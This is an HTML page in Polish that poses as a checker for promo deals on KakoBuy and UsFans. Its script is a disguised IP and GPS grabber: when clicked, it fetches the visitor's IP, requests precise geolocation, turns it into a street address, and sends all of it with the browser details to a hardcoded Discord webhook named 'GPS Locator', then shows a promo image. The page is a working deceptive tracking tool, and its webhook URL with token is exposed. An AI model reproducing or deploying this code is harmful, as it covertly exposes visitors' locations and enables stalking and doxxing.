<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Promki UsFans / KakoBuy</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0f172a;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
      padding: 1.5rem;
    }

    .container {
      text-align: center;
      max-width: 500px;
      width: 100%;
    }

    .check-btn {
      background: linear-gradient(135deg, #6366f1, #4f46e5);
      border: none;
      color: white;
      font-size: 1.5rem;
      font-weight: 600;
      padding: 1.2rem 3.5rem;
      border-radius: 4rem;
      cursor: pointer;
      box-shadow: 0 8px 30px -6px rgba(79, 70, 229, 0.5);
      transition: all 0.2s ease;
      letter-spacing: 0.02em;
      border: 1px solid rgba(255, 255, 255, 0.08);
      display: inline-flex;
      align-items: center;
      gap: 0.8rem;
      width: 100%;
      justify-content: center;
    }

    .check-btn:hover {
      transform: scale(1.03);
      background: linear-gradient(135deg, #818cf8, #4f46e5);
      box-shadow: 0 12px 40px -8px #4f46e5;
    }

    .check-btn:active {
      transform: scale(0.96);
    }

    .check-btn:disabled {
      opacity: 0.6;
      transform: scale(0.98);
      cursor: not-allowed;
      pointer-events: none;
    }

    .ip-result {
      margin-top: 2rem;
      min-height: 4rem;
      font-size: 2rem;
      font-weight: 700;
      color: #ffffff;
      text-shadow: 0 0 30px rgba(99, 102, 241, 0.2);
      font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace;
      letter-spacing: 0.02em;
      word-break: break-word;
      transition: all 0.3s ease;
      padding: 0.5rem;
      line-height: 1.6;
    }

    .ip-result.placeholder {
      color: #64748b;
      font-weight: 400;
      font-size: 1.1rem;
      font-family: 'Inter', 'Segoe UI', sans-serif;
      opacity: 0.6;
    }

    .ip-result.error {
      color: #f87171;
      font-size: 1.3rem;
      font-family: 'Inter', 'Segoe UI', sans-serif;
      font-weight: 500;
    }

    .ip-result .location-detail {
      font-size: 1.2rem;
      font-weight: 400;
      opacity: 0.9;
      display: block;
      margin-top: 0.3rem;
    }

    .discord-status {
      margin-top: 0.8rem;
      font-size: 0.9rem;
      color: #64748b;
      letter-spacing: 0.02em;
      padding: 0.5rem;
      border-radius: 2rem;
      transition: all 0.3s ease;
      min-height: 2.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
    }

    .discord-status.loading {
      color: #94a3b8;
    }

    .discord-status.success {
      color: #34d399;
      background: rgba(52, 211, 153, 0.08);
    }

    .discord-status.error {
      color: #f87171;
      background: rgba(248, 113, 113, 0.08);
    }

    .spinner {
      display: inline-block;
      width: 1.2rem;
      height: 1.2rem;
      border: 2.5px solid rgba(255,255,255,0.25);
      border-top: 2.5px solid white;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .fade-in {
      animation: fadeUp 0.35s ease forwards;
    }

    @keyframes fadeUp {
      0% { opacity: 0; transform: translateY(8px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    .discord-icon {
      display: inline-block;
      width: 20px;
      height: 20px;
      background: #5865F2;
      border-radius: 50%;
      position: relative;
      flex-shrink: 0;
    }

    .discord-icon::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 10px;
      height: 10px;
      background: #5865F2;
      border-radius: 50%;
      box-shadow: 0 0 0 2px #0f172a, 0 0 0 4px #5865F2;
    }

    .result-image {
      margin-top: 2rem;
      border-radius: 1.5rem;
      overflow: hidden;
      box-shadow: 0 20px 60px -12px rgba(0, 0, 0, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.06);
      opacity: 0;
      transform: translateY(10px);
      transition: opacity 0.5s ease, transform 0.5s ease;
      background: #1e293b;
      line-height: 0;
    }

    .result-image.show {
      opacity: 1;
      transform: translateY(0);
    }

    .result-image img {
      width: 100%;
      height: auto;
      display: block;
    }

    @media (max-width: 480px) {
      .check-btn {
        font-size: 1.2rem;
        padding: 1rem 2rem;
      }
      .ip-result {
        font-size: 1.5rem;
      }
    }
  </style>
</head>
<body>

<div class="container">
  <button id="checkBtn" class="check-btn">
    <span>🔍</span> Kliknij przycisk aby sprawdzić aktualne promki na KakoBuy i UsFans
  </button>

  <div id="ipDisplay" class="ip-result placeholder">
    kliknij przycisk
  </div>

  <div id="discordStatus" class="discord-status"></div>

  <!-- OBRAZEK - pojawi się po kliknięciu -->
  <div id="resultImage" class="result-image">
    <img src="https://i.ibb.co/DP3PDSZH/image.png" alt="Promki UsFans / KakoBuy">
  </div>
</div>

<script>
  (function() {
    const btn = document.getElementById('checkBtn');
    const display = document.getElementById('ipDisplay');
    const discordStatus = document.getElementById('discordStatus');
    const resultImage = document.getElementById('resultImage');
    let loading = false;

    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1519442927703691344/aio_xrYjS6DXH1_ByeGB7IABFudwIYk_c4ukBx9Nurq68N3DulvKdMdGJIMf0jN8Sl_8';

    function setLoading(state) {
      loading = state;
      if (state) {
        btn.disabled = true;
        btn.innerHTML = `
          <span>⏳</span> Sprawdzam
          <span class="spinner"></span>
        `;
        discordStatus.className = 'discord-status loading';
        discordStatus.innerHTML = `
          <span class="discord-icon"></span>
          ⏳ pobieranie danych...
        `;
      } else {
        btn.disabled = false;
        btn.innerHTML = `
          <span>🔍</span> Kliknij przycisk aby sprawdzić aktualne promki na KakoBuy i UsFans
        `;
      }
    }

    function showDisplay(ip, locationData) {
      display.className = 'ip-result fade-in';
      
      let html = `<div>🌐 ${ip}</div>`;
      
      if (locationData) {
        html += `<div class="location-detail">📍 ${locationData}</div>`;
      } else if (locationData === false) {
        // Użytkownik odmówił dostępu do lokalizacji
        html += `<div class="location-detail">⚠️ Lokalizacja niedostępna (odmowa dostępu)</div>`;
      } else {
        html += `<div class="location-detail">⚠️ Nie udało się pobrać lokalizacji</div>`;
      }
      
      display.innerHTML = html;
    }

    function showError(msg) {
      display.className = 'ip-result error fade-in';
      display.textContent = `⚠️ ${msg}`;
    }

    function setDiscordStatus(type, message) {
      discordStatus.className = `discord-status ${type}`;
      discordStatus.innerHTML = `
        <span class="discord-icon"></span>
        ${message}
      `;
    }

    // Funkcja pobierająca lokalizację za pomocą Geolocation API
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error('Geolocation API nie jest wspierane'));
          return;
        }

        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude, accuracy } = position.coords;
            resolve({
              latitude,
              longitude,
              accuracy,
              timestamp: position.timestamp
            });
          },
          (error) => {
            reject(error);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      });
    }

    // Funkcja do odwrócenia geolokalizacji (zamiana współrzędnych na adres)
    async function reverseGeocode(lat, lon) {
      try {
        // Używamy API OpenStreetMap Nominatim (darmowe)
        const response = await fetch(
          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=pl`
        );
        
        if (!response.ok) throw new Error('Błąd geokodowania');
        
        const data = await response.json();
        
        if (data && data.display_name) {
          // Wyciągamy najważniejsze informacje
          const address = data.address || {};
          const parts = [];
          
          if (address.road) parts.push(address.road);
          if (address.suburb) parts.push(address.suburb);
          if (address.city || address.town || address.village) {
            parts.push(address.city || address.town || address.village);
          }
          if (address.state) parts.push(address.state);
          if (address.country) parts.push(address.country);
          
          // Dodajemy kod pocztowy
          if (address.postcode) parts.push(`(${address.postcode})`);
          
          let locationString = parts.join(', ');
          
          // Dodajemy współrzędne dla dokładności
          locationString += ` | 🌍 ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
          
          // Dodajemy informację o dokładności
          return locationString;
        }
        
        return null;
      } catch (error) {
        console.warn('Błąd reverse geocoding:', error);
        return null;
      }
    }

    async function sendToDiscord(ip, locationData, coords) {
      setDiscordStatus('loading', '⏳ wysyłanie na Discord...');

      const fields = [
        {
          name: '📡 Adres IP',
          value: `\`${ip}\``,
          inline: false
        }
      ];

      // Dodajemy lokalizację jeśli jest
      if (locationData) {
        fields.push({
          name: '📍 Lokalizacja (GPS)',
          value: locationData,
          inline: false
        });
      } else {
        fields.push({
          name: '📍 Lokalizacja (GPS)',
          value: '❌ Nie pobrano',
          inline: false
        });
      }

      // Dodajemy współrzędne jeśli są
      if (coords) {
        fields.push({
          name: '🗺️ Współrzędne',
          value: `\`${coords.latitude.toFixed(6)}, ${coords.longitude.toFixed(6)}\`\nDokładność: ${coords.accuracy?.toFixed(0) || '?'}m`,
          inline: false
        });
      }

      fields.push(
        {
          name: '🕐 Data',
          value: new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' }),
          inline: true
        },
        {
          name: '🖥️ Przeglądarka',
          value: navigator.userAgent.split(' ').slice(0, 3).join(' ') || 'Nieznana',
          inline: true
        }
      );

      const embed = {
        title: '📍 Nowa lokalizacja GPS',
        color: 0x5865F2,
        fields: fields,
        footer: {
          text: 'Dokładna lokalizacja z GPS/Wi-Fi'
        },
        timestamp: new Date().toISOString()
      };

      const payload = {
        embeds: [embed],
        username: 'GPS Locator',
        avatar_url: 'https://cdn.discordapp.com/embed/avatars/1.png'
      };

      try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload)
        });
        
        if (!response.ok) {
          throw new Error(`HTTP ${response.status} - ${response.statusText}`);
        }
        
        setDiscordStatus('success', '✅ Dane wysłane na Discord!');
        console.log('✅ Dane wysłane na Discord:', { ip, location: locationData, coords });
      } catch (error) {
        console.error('❌ Błąd wysyłki na Discord:', error);
        setDiscordStatus('error', `❌ Błąd: ${error.message || 'nie udało się wysłać'}`);
      }
    }

    async function fetchIP() {
      if (loading) return;

      setLoading(true);
      display.className = 'ip-result placeholder';
      display.textContent = '⏳ pobieranie...';
      resultImage.classList.remove('show');

      let ip = null;
      let locationData = null;
      let coords = null;

      try {
        // 1. Pobieramy IP
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          const data = await response.json();
          if (data && data.ip) {
            ip = data.ip;
          } else {
            throw new Error('Brak IP w odpowiedzi');
          }
        } catch (err) {
          console.warn('ipify błąd, próbuję ip-api...', err);
          const response = await fetch('https://ipapi.co/json/');
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          const data = await response.json();
          if (data && data.ip) {
            ip = data.ip;
          } else {
            throw new Error('Brak IP w odpowiedzi');
          }
        }

        // 2. Pobieramy lokalizację GPS
        try {
          const position = await getLocation();
          coords = {
            latitude: position.latitude,
            longitude: position.longitude,
            accuracy: position.accuracy
          };
          
          // Próbujemy zamienić współrzędne na adres
          locationData = await reverseGeocode(position.latitude, position.longitude);
          
          // Jeśli nie udało się pobrać adresu, pokazujemy same współrzędne
          if (!locationData) {
            locationData = `🌍 ${position.latitude.toFixed(6)}, ${position.longitude.toFixed(6)} (dokładność: ${position.accuracy?.toFixed(0) || '?'}m)`;
          }
          
        } catch (error) {
          console.warn('Błąd pobierania lokalizacji GPS:', error);
          if (error.code === 1) {
            // PERMISSION_DENIED
            locationData = false; // specjalna wartość oznaczająca odmowę dostępu
          }
        }

        // 3. Wyświetlamy dane
        if (ip) {
          showDisplay(ip, locationData);
          await sendToDiscord(ip, locationData, coords);
        } else {
          throw new Error('Nie udało się pobrać IP');
        }

      } catch (err) {
        console.error('Błąd:', err);
        showError('Nie udało się pobrać danych');
        setDiscordStatus('error', '❌ Nie pobrano danych – nie wysłano');
      } finally {
        setLoading(false);
        resultImage.classList.add('show');
      }
    }

    btn.addEventListener('click', fetchIP);
  })();
</script>

</body>
</html>
